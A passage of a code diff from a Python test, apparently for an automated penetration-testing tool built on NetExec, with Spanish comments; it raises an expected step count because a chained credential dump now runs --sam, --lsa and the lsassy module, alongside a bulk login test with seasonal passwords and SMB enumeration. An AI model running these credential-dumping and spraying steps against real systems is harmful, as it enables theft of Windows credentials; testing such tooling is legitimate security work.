                                     bulk=(["alice", "bob"], ["Summer2024", "Winter2024"], False))
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
-    # 1 bulk + 2 del volcado encadenado (alice) + 5 de _creds_enum (alice: --shares/--users/
-    # --pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) + 1 explícito de "dave" ("dave"
-    # no vuelve a disparar _creds_enum: "smb" ya está en 'enriched')
-    assert len(_mix[0]["steps"]) == 9
+    # 1 bulk + 3 del volcado encadenado (alice: --sam/--lsa/-M lsassy) + 5 de _creds_enum (alice:
+    # --shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) + 1 explícito
+    # de "dave" ("dave" no vuelve a disparar _creds_enum: "smb" ya está en 'enriched')
+    assert len(_mix[0]["steps"]) == 10
 
     # Orden de protocolos (_CREDS_PROTO_PRIORITY): SMB y LDAP antes que WMI (más lento y con un
     # bug confirmado de nxc contra listas de usuarios) y que WinRM/RDP/MSSQL, sea el orden de
